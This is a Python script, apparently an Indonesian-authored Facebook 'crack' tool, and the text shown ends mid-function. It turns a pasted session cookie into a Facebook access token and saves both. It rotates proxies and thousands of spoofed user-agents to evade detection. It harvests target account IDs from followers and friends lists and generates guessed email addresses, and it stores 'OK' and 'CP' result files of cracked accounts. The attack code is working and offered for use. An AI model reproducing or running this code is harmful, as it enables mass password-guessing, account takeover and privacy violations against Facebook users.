#-----------------[ IMPORT-MODULE ]-------------------
import requests,json,os,sys,random,datetime,time,re
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich.panel import Panel
from rich import print as cetak
from rich.tree import Tree
import zlib
import subprocess
import base64
from rich.text import Text as text_rich
from rich.text import Text as tekz
from rich import print as zprint
from rich import print as vprint
from rich import print as prints
from rich import print as iprint
from rich import pretty
pretty.install()
CON=sol()
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
#kecepatan mengetik
        time.sleep(random.random() * 0.1)
#ubah angka 0.1 sesuai keinginan kamu
#angka terkecil adalah yang paling cepat
#angka terbesar adalah yang paling lambat

def mtkk(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
#kecepatan mengetik
        time.sleep(random.random() * 0.01)
def mulai():
    os.system("git pull")
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen3=[]
ugen2=[]
ugen=[]
ua_crack=[]
cokbrut=[]
urut=[]
ses=requests.Session()
princp=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get('https://github.com/SakuraDevOps/Free-Proxies/blob/master/proxies/premium.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mF7 Vyex')
prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):
    rr = random.randint
    rc = random.choice
    a = ['2.3.6;','4.0.4;','4.2.1;','4.2.2;','4.3;','4.4.2;','4.4.4;','5.0;','5.0.2;','5.1;','5.1.1;','6.0;','6;','6.0.1;','7.0;','7.0.1;','7;','8;','8.0;','8.0.1;','9;','10;','11;','12;']
    b = ['zh-cn;','en-us;','id-id;','en-gb;','ru-ru;','jap-jap;','en-ca;','es-mx;','zh-tw;','ko-kr;','th-th;','en-in;','el-gr;','tr-tr;','fr-fr;','en-ez;','zh-hk;','ar-ae;','ru-ru;','zh-CN;en-US;','fr-ch;','pt-br;','nl-nl;']
    c = ['QP1A','RKQ1','PPR1','QKQ1','KOT49H','JSS15J']
    az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    a1 = [
    f'Mozilla/5.0 (Linux; Android {str(rc(a))} {str(rc(b))} {str(rc(az))} {str(rc(az))}{str(rr(1000,9999))}{str(rc(az))} Build/{str(rc(c))}.{str(rr(100000,999999))}.020; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}',
    f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} CPH{str(rr(1000,9999))}) Build/{str(rc(c))}.{str(rr(100000,999999))}.020; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}',
    f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} SAMSUNG GT-{str(rc(az))}{str(rr(1000,9999))}{str(rc(az))}) Build/GINGERBREAD) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}',
    f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} RMX{str(rr(1000,9999))}) Build/{str(rc(c))}.{str(rr(100000,999999))}.020; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}',
    f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} Redmi {str(rr(3,10))}{str(rc(az))} Build/{str(rc(c))}.{str(rr(100000,999999))}.011; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}',
    f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} {str(rr(1000000,9999999))}) Build/{str(rc(c))}.{str(rr(100000,999999))}.001; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}',
    f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} XQ- {str(rc(az))}{str(rc(az))}{str(rr(11,999))} Build/{str(rc(c))}.{str(rr(100000,999999))}.020; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}',
    f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} ASUS{str(rc(az))}00{str(rc(az))}) Build/{str(rc(c))}.{str(rr(100000,999999))}.020; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}',
    f"Mozilla/5.0 (Linux; Android {str(rr(2,12))}.{str(rr(2,9))}.{str(rr(2,10))}; HP Slate 7 HD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,101))}.0.4044.138 Safari/537.36 {str(rc(['OculusBrowser','SamsungBrowser','YaSearchBrowser']))}/{str(rr(30,109))}.02.1485.78487",
    f"Mozilla/5.0 (Linux; Android {str(rr(2,12))}.{str(rr(2,9))}.{str(rr(2,10))}; i-mobile i-TAB DTV Build/{str(rc(az))}{str(rc(az))}{str(rc(az))}{str(rr(11,99))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,101))}.0.2311.111 Safari/537.36 {str(rc(['OculusBrowser','SamsungBrowser','YaSearchBrowser']))}/{str(rr(30,109))}.02.1485.78487",
    f"Mozilla/5.0 (Linux; Android {str(rr(2,12))}; HP Chromebook x360 11 G1 EE Build/{str(rc(az))}{str(rr(11,99))}-{str(rr(11111,99999))}.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,100))}.0.4389.105 Safari/537.36 {str(rc(['OculusBrowser','SamsungBrowser','YaSearchBrowser']))}/{str(rr(30,109))}.02.1485.78487",
    f"Mozilla/5.0 (Linux; Android {str(rr(2,12))}.{str(rr(2,9))}.{str(rr(2,10))}; NEO-{str(rc(['X7-216A','X5-116A','U9-H']))} Build/{str(rc(az))}{str(rc(az))}{str(rc(az))}{str(rr(11,99))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,100))}.0.1916.138 Safari/537.36 {str(rc(['OculusBrowser','SamsungBrowser','YaSearchBrowser']))}/{str(rr(20,50))}.0.1485.78487",
    f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; {str(rc(['RMX1809',f'Redmi Note {str(rr(6,10))}','CPH1809','SM-N915G','V2123A']))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,101))}.0.4664.104 Mobile Safari/537.36 {str(rc(['OculusBrowser','SamsungBrowser']))}/3/32.9920.72",
    f"Instagram {str(rr(100,300))}.0.0.27.120 Android (29/{str(rr(3,10))}; 420dpi; 1080x2186; samsung; SM-A{str(rr(100,999))}F; a{str(rr(15,55))}; exynos{str(rr(1111,9611))}; id_ID; 332901678)"]
    uaku = random.choice(a1)
    ugen.append(uaku)
   
def uaku():
	try:
		ua=open('Safari.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Ruphas-Mafahl-XD/List-Of-UserAgent2022/blob/master/Safari.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,taplikasi,tokenku,uid= [],[],0,0,0,[],[],[],[],[],[]
cokbrut=[]
uadia, uadarimu = [],[]
pwpluss,pwnya=[],[]
dump=[]
#--------------[ mokmkoeieib ]
url = "https://mbasic.facebook.com"
m_fb = "m.facebook.com"
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
web_fb = "https://www.facebook.com/"
head_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
host = "https://mbasic.facebook.com"

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_table = "#00C8FF"
except FileNotFoundError:
	color_table = "#00C8FF"
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
warna_warni_biasa=random.choice([H,K,M,O,B,U])
warna_warni_rich_cerah=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
warna_warni_rich=random.choice([J3])
#garis = f" {P}[{warna_warni_biasa}•{P}]"
garis = f" {P}[{warna_warni_biasa}•{P}]"
asu = random.choice([m,k,h,u,b])

try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.1)
def clear():
        os.system('clear')
#BANNER
def banner():
	clear()
def back():
	menu()
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{H} proses...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
#------------------[ VERSION 1.0.9 ]-----------------#
def banner():
	os.system("clear")
	cetak(Panel(f"""\t
    ',.       ',.      ,'      ',.       ''''''''       .,'     .''
    ;00.     :00       ;0O.   k0c        00o             c0O.  ,00.
     x0k    .00.        '0O. k0;         00:              ,00';00
      00l   k0;          .0Ox0,          00kllll           ,0000
      .00. l0x            '00;           00c               k0:00c
       l0k'00             .00.           00:             .O0.  O0o
        O000.             .00.           00Oooooo       ,00.    k0x
                                                    """,width=80,style=f"{warna_warni_rich}"))
#--------------------[ BAGIAN-MASUK ]--------------#
def linex():
	print("%s══════════════════════════════════════════════════════════════════════%s"%(P,P))
def Code_():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=name,id,birthday&access_token='+tokenku[0], cookies={'cookie':cok})
			menu()
		except KeyError:
			login()
		except requests.exceptions.ConnectionError:
			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login()

def login():
	os.system('clear')
	banner()
	x=f"{P2}halo pengguna script Crack F7 Vyex :)\n{P2}silahkan pilih fitur login cookie untuk melanjutkan ke menu crack multi fast.. klo tidak mengerti apa² bisa ketik {M2}help {P2}untuk meminta bantuan !!"
	vprint(panel(x,style=f"{warna_warni_rich}",width=80,padding=(0,4)))
	print("")
	x=f"{P2}[01] login with cookie\n{P2}[02] report bug script\n{P2}[{M2}00{P2}] exit "
	vprint(panel(x,style=f"{warna_warni_rich}",width=80,padding=(0,4)))
	cukuf = input(f" {P}[{H}•{P}] pilih : {H}")
	if cukuf in ["help","Help","HELP"]:
		print("")
		x=f"{P2} WhatsApp admin *--> {H2}083823705893 {P2}harap chat klo ada kepentingan yang mau disampaikan ke author Vyex\nini klo gak bisa diarahin ke WhatsApp admin yakk"
		vprint(panel(x,style=f"{warna_warni_rich}",width=80,padding=(0,4)))
		print("")
		x=f"{P2}sedang diarahkan ke WhatsApp author"
		vprint(panel(x,style=f"{H3}",width=80,padding=(0,4)))
		os.system('xdg-open https://wa.me/+6283823705893?text=bang+cara+pake+script+abang+kek+mana?')
		input(f" {P}[{H}•{P}] kembali")
		login()
	elif cukuf in ["1","01"]:
		login_cookie()
	elif cukuf in ["2","02"]:
		print("")
		x=f"{P2} WhatsApp admin *--> {H2}+6283823705893{P2}harap chat klo memang ada yang error\nini klo gak bisa diarahin ke WhatsApp admin yakk"
		vprint(panel(x,style=f"{warna_warni_rich}",width=80,padding=(0,4)))
		print("")
		x=f"{P2}sedang diarahkan ke Telegram author"
		vprint(panel(x,style=f"{warna_warni_rich}",width=80,padding=(0,4)))
		os.system('xdg-open https://wa.me/+6283823705893?text=bang+script+mu+itu+ada+yang+error!!')
		input(f" {P}[{H}•{P}] kembali")
		login()
	elif cukuf in ["0","00"]:
		exit()
	else:
		print("")
		jalan(f"{garis} isi yang benar!! ")
		login()

def login_cookie():
	print("")
	x = f"jangan pake akun pribadi!! harus pake akun tumbal untuk ambil cookie"
	vprint(panel(x,style=f"{H3}",width=80,padding=(0,4)))
	cookie = str(input(f"{garis} masukkan cookie :"+H+" "))
	with requests.Session() as xyz:
		try:
			jalan(f"{garis} sedang login mohon tunggu  ")
			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
			find_token = re.search("(EAAG\w+)", data.text)
			cok=open(".cok.txt", "w").write(cookie)
			token=open(".token.txt", "w").write(find_token.group(1))
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter ngab ")
			menu()
		except requests.exceptions.ConnectionError:
			x=f"{P}koneksi internet bermasalah"
			vprint(panel(x,style=f"{M3}",width=80,padding=(0,4)))
		except (KeyError,IOError):
			x=f"{P}{cookie} invalid"
			vprint(panel(x,style=f"{warna_warni_rich}",width=80,padding=(0,4)))
			os.system("rm -rf cookie.txt")
			os.system("rm -rf token.txt")
			login()

def menu():
	banner()
	try:EwePaksa = requests.get("http://ip-api.com/json/").json()
	except:EwePaksa = {'-'}
	try:IP = EwePaksa["query"]
	except:IP = {'-'}
	try:nibba = EwePaksa["country"]
	except:nibba = {'-'}
	try:rasis_Z_K_= EwePaksa["isp"]
	except:rasis_Z_K_ = {'-'}
	try:rasis_Z_K_X_= EwePaksa["city"]
	except:rasis_Z_K_X_ = {'-'}
	try:rasis_Z_K_X_R_= EwePaksa["timezone"]
	except:rasis_Z_K_X_R_ = {'-'}
	try:rasis_Z_K_X_R_H_= EwePaksa["countryCode"]
	except:rasis_Z_K_X_R_H_ = {'-'}
	try:rasis_Z_K_X_R_H_M_= EwePaksa["regionName"]
	except:rasis_Z_K_X_R_H_M_ = {'-'}
	try:rasis_Z_K_X_R_H_M_P_= EwePaksa["as"]
	except:rasis_Z_K_X_R_H_M_P_ = {'-'}
	token = open('.token.txt','r').read()
	cok = open('.cok.txt','r').read()
	get = requests.get('https://graph.facebook.com/me?fields=name,id,birthday&access_token='+tokenku[0], cookies={'cookie':cok})
	jsx = json.loads(get.text)
	nama = jsx["name"]
	tumbal_id = jsx["id"]
	xn = requests.Session().get('https://graph.facebook.com/me?access_token='+tokenku[0], cookies={'cookie':cok})
	x = json.loads(xn.text)
	lis = x["link"]
	try:co = x["email"]
	except (KeyError,IOError):
		co = M+"-"+P
	try:pko = x["birthday"]
	except (KeyError,IOError):
		pko = M+"-"+P
	try:no_kep = x["mobile_phone"]
	except (KeyError,IOError):
		no_kep = M+"-"+P
	try:lok = x["locale"]
	except (KeyError,IOError):
		lok = M+"-"+P
	data = []
	data.append(panel(f'[cyan]Name : {nama}\nId   : {tumbal_id}\nTtl  : {pko}\nPREMIUM : [bold green]YES',width=40,padding=(0,4),style=f"{warna_warni_rich}"))
	data.append(panel(f'[cyan]Ip       : {IP}\nTanggal  : {tgl} {bln} {thn}\nAuthor   : F7 Vyex\nLisensi :[bold red] VYKY-**********',width=40,padding=(0,1),style=f"{warna_warni_rich}"))
	wa.print(Columns(data))
	prints(Panel(f"""{P2}[{H2}01{P2}]. crack massal                [{H2}06{P2}]. lihat hasil crack
[{H2}02{P2}]. crack publik                [{H2}07{P2}]. crack nomor 
[{H2}03{P2}]. crack email                 [{H2}08{P2}]. Crack Publik {H2}V2{P2}
[{H2}04{P2}]. crack file                  [{H2}09{P2}]. upgrade ke {H2}premium{P2}
[{H2}05{P2}]. cloning                     [{H2}00{P2}]. keluar ({A2}hapus cookie{P2})""",width=80,padding=(0,4),style=f"{warna_warni_rich}"))
	_____renv__renv_____ = input(f'└──> Select : ')
	if _____renv__renv_____ in ['1']:
		dump_massal()
	elif _____renv__renv_____ in ['2']:
		dump_publik()
	elif _____renv__renv_____ in ['3']:
		email()
	elif _____renv__renv_____ in ['4']:
	    file_cp()
	elif _____renv__renv_____ in ['5']:
		crack_foll()
	elif _____renv__renv_____ in ['6']:
		result()
	elif _____renv__renv_____ in ['7']:
		nomor()
	elif _____renv__renv_____ in ['8']:
		dum_publik()
	elif _____renv__renv_____ in ['9']:
		error()
	elif _____renv__renv_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Successfully Logout+Delete Cookies ')
		exit()
	else:
		print('>> input correctly ')
		menu()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	menu()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'[{b}01{x}] Result {h}OK{x} ')
	print(f'[{b}02{x}] Result {k}CP{x} ')
	print(f'[{b}03{x}] Return	')
	kz = input(f'\n>> Choose : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Not Found ')
			time.sleep(2)
			menu()
		if len(vin)==0:
			print('>> You Dont Have File CP ')
			time.sleep(2)
			menu()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {k}%s{x} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({k} %s {x}id )'%(cih,isi,(len(hem))))
			geeh = input(f'\nChoose : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Choose Correctly ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Not Found ')
				time.sleep(2)
				menu()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Click Enter{x} ]')
			menu()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Not Found ')
			time.sleep(2)
			menu()
		if len(vin)==0:
			print('>> You Dont Have File OK ')
			time.sleep(2)
			menu()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {h}%s{x} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({h} %s {x}id )'%(cih,isi,(len(hem))))
			geeh = input(f'\nChoose : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Choose Correctly ')
				menu()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Not Found ')
				time.sleep(2)
				menu()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Click Enter{x} ]')
			back()
	elif kz in ['3']:
		menu()
	else:
		print('>> Choose Correctly ')
		menu()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{garis} MAU BERAPA TARGET:'))
	except ValueError:
		print(f'{garis} MASUKKAN ANGKA JANGAN HURUF ')
		exit()
	if jum<1 or jum>100:
		print(f'{garis} GAGAL MEMERIKSA ID ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{garis} MASUKAN ID YANG KE{h}{x} '+str(yz)+':')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/'+userr+'?fields=subscribers.limit(99999)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['subscribers']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('├──> JARINGAN ERROR COBA LAGI ')
			exit()
	try:
		#jalan(f"{garis} sedang proses mohon tunggu "),time.sleep(0.)
		print(f'{garis}TOTAL ID TARGET  : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('├──> JARINGAN ERROR COBA LAGI ')
		back()
	except (KeyError,IOError):
		print(f'├──>{k} PERTEMANAN TIDAK PUBLIK {x}')
		time.sleep(3)
		back()
		
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print(f' {garis} Ketik {m}me{P} Jika Ingin Crack Follower Sendiri ')
	pil = input(f' {garis} Masukkan Id Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f' {garis} Total Id : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('>> Koneksi Internet Bermasalah ')
		menu()
	except (KeyError,IOError):
		print('Gagal Mengambil Target ')
		menu()
		
def dum_publik():
	try:
		token = open('.tokek.txt','r').read()
		cookie = open('.cookie.txt','r').read()
	except IOError:
		exit()
	print('╰─ Ketik "\033[32mme\033[0m" Jika Ingin Crack Teman Sendiri ')
	pil = input(x+'╰─'+m+''+x+' Username/Id : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cookie}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('')
		print(x+'╰─'+m+''+x+' Total Id Collected \033[32m'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('╰─ Internetmu Gak Ada Bodoh')
		exit()
	except (KeyError,IOError):
		print('╰─ Pertemanan Tidak Publick Cookie And Token Anda Busuk')
		menu()
		
def email():
	x = 0
	prints(Panel(f"""{P2}
[{color_rich}01{P2}]. dump search name from @gmail.com
[{color_rich}02{P2}]. dump search name from @yahoo.com
[{color_rich}03{P2}]. dump search name from @hotmail.com
[{color_rich}04{P2}]. dump search name from @outlook.com
""",width=80,padding=(0,14),style=f"{color_table}"))
	ask = input(f" {N}choose email : ")
	if ask in["1"]:
		email = "@gmail.com"
		nama = input(f" {N}input name : ")
		jumlah = int(input(f" {N}input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(nama+str(x)+email+"<=>"+nama)
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	elif ask in["2"]:
		email = "@yahoo.com"
		nama = input(f" {N}input name : ")
		jumlah = int(input(f" {N}input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(nama+str(x)+email+"<=>"+nama)
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	elif ask in["3"]:
		email = "@hotmail.com"
		nama = input(f" {N}input name : ")
		jumlah = int(input(f" {N}input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(nama+str(x)+email+"<=>"+nama)
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	elif ask in["4"]:
		email = "@outlook.com"
		nama = input(f" {N}input name : ")
		jumlah = int(input(f" {N}input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(nama+str(x)+email+"<=>"+nama)
